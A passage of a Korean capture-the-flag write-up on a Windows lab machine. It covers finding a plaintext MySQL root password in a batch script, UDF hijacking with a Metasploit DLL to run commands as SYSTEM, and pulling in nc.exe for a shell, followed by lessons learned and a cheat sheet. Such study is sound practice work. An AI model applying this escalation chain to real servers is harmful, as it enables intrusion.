![programdata](https://github.com/user-attachments/assets/b128901c-b88b-46b8-a0b9-0f0e2d14aa7b#.png)

도착을 하니 보이는 파일은 4개가 있었다. 그리고 딱 봐도 `db-config.ini`가 범인이겠구나! 하고 열어봤지만 왠걸? 여기엔 아까 찾았던 `kiosk_app`의 계정만이 존재했다.

그래서 실망하며 다른 스크립트도 열어봤는데

![어어](https://github.com/user-attachments/assets/6bd02c7a-6292-4681-8b13-5f69a105ae36#.png)

오잉?? 정작 보안에 신경을 쓴 `db-config.ini`엔 최소권한 계정만 있는데 `refresh-dates.bat`엔 root 비번이 평문으로 그냥 박혀있는게 아니겠는가?!

자동화 스크립트(.bat, 스케줄 작업, 크론잡 등)는 사람이 매번 비번을 입력할 수 없으니 크레덴셜을 그냥 하드코딩해두는 경우가 많다(특히 그게 문제라면). 그러니 문제 풀면서 꼭 한번 확인하기!

자 그럼 이제 mysql의 루트 권한 크레덴셜을 얻었으니 다시 FILE 권한을 확인하러, UDF를 하러 가보자!

### 4-4. MySQL UDF 하이재킹 — DB를 통해 SYSTEM 명령 실행

![file](https://github.com/user-attachments/assets/0d84a056-9a5b-4dae-a164-261132513837#.png)

당연하게도 이 계정으로 MySQL의 FILE 권한을 확인해보면 위에서도 확인 했듯 다른 계정은 전부 권한이 없지만 root 계정(방금 얻음)만이 권한을 갖고 있는걸 알 수 있다.

![user](https://github.com/user-attachments/assets/cd76f24c-edff-44bc-b0fc-49a6f7195937#.png)

USER()로 한번 더 확인해보아도 역시 루트다.

![plugin_dir](https://github.com/user-attachments/assets/49e55cea-852d-4812-b480-977b614806b0#.png)

자 그럼 드디어 이제 UDF를 쓸 차례인데 이걸 하려면 `.dll`을 MySQL이 플러그인을 읽어들이는 폴더에 넣어야 했다. 그래서 그 위치를 확인해보니 위처럼 `C:\MySQL\lib\plugin\`이었다.

![metasploit](https://github.com/user-attachments/assets/b8f8cdbc-9b46-49e7-a452-3b55149bde40#.png)

자 그리고 이제 쓸 DLL(`lib_mysqludf_sys_64.dll`)은 Kali의 metasploit 폴더에 이미 있기에 그걸 가져다가 썼다.

그리고 사실 여기서 원래 교과서적인 UDF의 방법은 DLL을 SQL로 올리는 것이다. 예를 들면 `SELECT ... INTO DUMPFILE 'C:/.../plugin/...` 이런 느낌으로 말이다.

그런데 4-2에서 찾았던 `secure_file_priv = NULL` 이 녀석 때문에 MySQL이 SQL로 디스크에 파일을 쓸 수가 없었다.

그럼 어떻게 해야할까?

![IWR](https://github.com/user-attachments/assets/12254419-cb05-432b-9abe-1f909b982db6#.png)

그건 바로 이미 갖고 있던 PowerShell로 그냥 `IWR` 해서 plugin 폴더에 직접 떨궈버리면 되는 것이었다.

![createfunction](https://github.com/user-attachments/assets/2da66e95-9ddc-4a88-8e2e-03675daae1f5#.png)

그렇게 넘긴 DLL을 `CREATE FUNCTION`으로 MySQL 함수에 등록하고, `SELECT sys_eval('whoami')`를 날려보면?

`nt authority\system` 

SYSTEM 권한으로 명령이 실행되었다!! 사실상 이걸 이용하면 어떤 명령어든 실행시킬 수 있으니 루트 권한을 획득한 것이나 마찬가지다!

### 4-5. SYSTEM 셸과 root.txt

![root](https://github.com/user-attachments/assets/64e3db81-95a1-4e93-bbdc-5d9728e8a98c#.png)

그렇게 루트 플래그를 꺼내받을 수 있었다.

![nc](https://github.com/user-attachments/assets/96096c3d-b5b3-4c53-9176-a9800f43259a#.png)

그런데 말입니다. 

소오올 직히 말해서 그냥 이렇게 루트 플레그만 얻고 끝내는건 좀 그렇지 않은가?

아예 `nc.exe`를 넘겨 확실하게 쉘을 받아오기로 했다.

![IWRnc](https://github.com/user-attachments/assets/d656d74c-e7e4-4f4f-b219-8cf425d5387d#.png)

위에서 했듯 IWR로 `nc.exe`를 받아오고, 실행을 시켜주면? 

`-e "SELECT sys_eval('...')"` 안에서 경로를 `C:\Windows\...`처럼 쓰면, 백슬래시가 이스케이프 문자로 먹혀버려서 경로가 깨진다. 그래서 `C:\\Windows\\...`로 `\`를 두 번씩 써줘야 제대로 전달된다. 

(그래서 첫 시도가 NULL이었던 것)

![이렇게](https://github.com/user-attachments/assets/5ea6ef59-7db8-427c-9682-a35e7ecb6083#.png)

이렇게 경로를 제대로 지정해주게 되면?

![system](https://github.com/user-attachments/assets/7fc2d689-e0eb-4da1-9b7d-946159037731#.png)

완벽하게! 시스템 권한까지 얻어낼 수 있다!!

![루트 플레그 야호](https://github.com/user-attachments/assets/8c633b1d-f242-47cf-b9d9-3926a8687408#.png)

루트 플레그도 얌전히 있고!! 야호~!

## 마치며

![Touch](https://github.com/user-attachments/assets/2bfd2ffd-8b69-497f-a349-427bb7ab9b12#.png)

솔직히 고백하자면, 이 문제는 나를 많이 꺾었다.

"EASY 하나 딱 풀고 OSCP+ 등록해야지!" 하고 호기롭게 시작했는데, 정작 초기 침투 시작점에서부터 막혀서 멘탈이 세 번은 흔들렸다. 다 풀고 나서 체인을 되짚어보면 

"어? 이게 이렇게 간단한 거였어?" 싶은데, 풀 때는 그게 안 보였다. 때론 하나에 매몰되기 보단, 전체적인 흐름을 볼 줄 알아야 하는데 아무래도 내가 아직 그게 부족해 보인다.

> 내가 빠졌던 래빗홀들

난 삽질 자체가 문제는 아니였다. 다만 한 번 파기 시작하면 그거에서 빠져나올 줄을 몰랐다.

- MRZ 인젝션 - 스캐너에 MRZ 파싱 기능이 있으면 여기에 뭔가 넣을 수 있겠다! 싶어 진짜 인터넷에서 MRZ가 뭔지, 어떻게 만들 수 있는지 등을 알아보고 직접 만들어 올리고, 포맷도 바꿔가면서 한참 팠었다. 근데 이게 아니였다.
- 프린터 관제 - 시도 횟수가 한정되어있다면 확실하게 알고 진행을 했어야 했는데, 일단 난 계속 시도만 해봤었다. 실제 업무였다면 이미 EDR에 잡히고도 남았을...
- RPC/WinRM의 혼동 - nmap의 결과를 제대로 다 이해하지 않고 135(RPC)인데 WinRM 되겠네 하고 엉뚱한 데서 삽질했었다. 정답은 3389(RDP)였는데.

> OSCP+ 를 시작하며 이것만은 확실히

1. **Enumeration은 먼저, 끝까지.** 삽질의 거의 절반 이상은 내가 nmap의 결과를 대충 읽고, 페이지 소스도 살펴보지 않아서 생겼었다. `/api/status`도, 소스 속 `login-hint`도, `index.ts`의 경로도 모두 다시 보면 아 이건데 싶었던 것들인데 내가 보지 않았었다.
2. **Enumeration은 꼭 정리 하자.** 그래야 내가 나중에 문제를 풀다가도 이게 아닌 것 같으면 다시 한 번 어디를 도전해볼지 확실히 알 수 있을 태니까.
3. **타임박스를 걸자.** 한 방향으로 쭉 나아가다가 N분 이상 진전이 없다면 멈추고 다른 걸 봐보자. 래빗홀에서 빠져나오는 유일한 방법은 "이건 아닌가?" 하고 손을 잠시 떼고 눈을 다른 곳으로 돌리는 거더라.
4. 2번과 이어지는 거긴 한데 **봤던 단서들은 메모를 하자.** 물론 스크린 샷을 찍어두긴 하겠지만 찾아본 것들을 따로 정리를 해두면 경로를 찾기 더 쉬울 것 같다.
5. **쉘/환경부터 안정시키자.** 물론 이번의 문제는 해외에 있는 서버라 물리적으로 딜레이가 걸리는건 어쩔 수 없긴 했다. 그리고 ConPtyShell과 같은 경우에도 윈도우 CMD에서 글자 크기를 받아올 때 꼬이게 되면 생기는 문제였긴 했지만 그래도 쉘을 안정화 시키는건 필수라고 생각한다.

> 추후 치트 시트에 넣을 것들

- **포트/서비스 맵** : nmap에 써있는게 다가 아니니까 내가 이번에 해깔렸던 135=RPC(엔드포인트 매퍼, 셸 아님) / 5985=WinRM-HTTP / 5986=WinRM-HTTPS / 3389=RDP(ms-wbt-server) 과 같은 부분은 적어둬야겠다.
- **서비스별 접근 그룹** : 특히나 윈도우 머신일 때 문제인데, WinRM = Remote Management Users, RDP = Remote Desktop Users, 이렇게 분류를 해둬야겠다.
- **nxc RDP 오탐** : 이 경우도 물론 글을 잘 읽어보면 되긴 하는데 내가 빨간 색만 보고 아 안되네 하지 않게 `SSL_NOT_ALLOWED_BY_SERVER`는 인증 실패가 아니라 TLS 협상 실패 -> `xfreerdp /sec:rdp`로 직접 확인하기.
- **파일 전송(윈도우)** : `.ps1=IEX`로 메모리 실행 / `.exe=IWR -OutFile` 또는 `certutil`로 디스크에 저장
- **키오스크 탈출** : 이런 문제가 나올지는 모르겠지만 나온다면, 에러 유발 -> 다이얼로그 링크 -> 브라우저 -> URL창에 내부 파일 `C:\Windows\System32\cmd.exe`.
- **MySQL UDF** : `secure_file_priv=NULL`이면 `INTO DUMPFILE` 못 씀 -> 셸로 직접 plugin_dir에 DLL 업로드 -> `CREATE FUNCTION sys_eval` -> SYSTEM, MySQL에서 이런 방법이 있다 정도만 적어두기.
- **크레덴셜 사냥** : 설정 파일만 보지 말고 **자동화 스크립트(.bat, 스케줄 작업)**를 꼭 열어볼 것.

### 그래서, OSCP+는 어떻게 할 거냐고?

어제는 "easy도 혼자 못 푸는데 무슨 OSCP냐" 싶어서 등록을 미뤘다.

근데 지금 생각은 좀 다르다. **이 문제는 결국 풀었고, 못 풀었던 건 지식이 없어서가 아니라 "방법론"이 없어서였다.** 래빗홀에서 못 빠져나오는 것, enumeration을 대충 하는 것 — 이건 PEN-200 과정을 밟으면서 고쳐나갈 수 있을 지도 모르겠다. 애초에 난 비전공자이기에 그런거 배우자고 등록하는 거니까. 지금까지 HTB문제를 이렇게 풀어왔는데 못할게 있을까?

그래서 오늘 내일은 치트시트부터 만들고, 마음 좀 다잡고, 다음주 부터 다시 등록 버튼을 누르러 가려고 한다.

try harder, 하지만 try smarter도.

Happy Hacking이 될 수 있기를.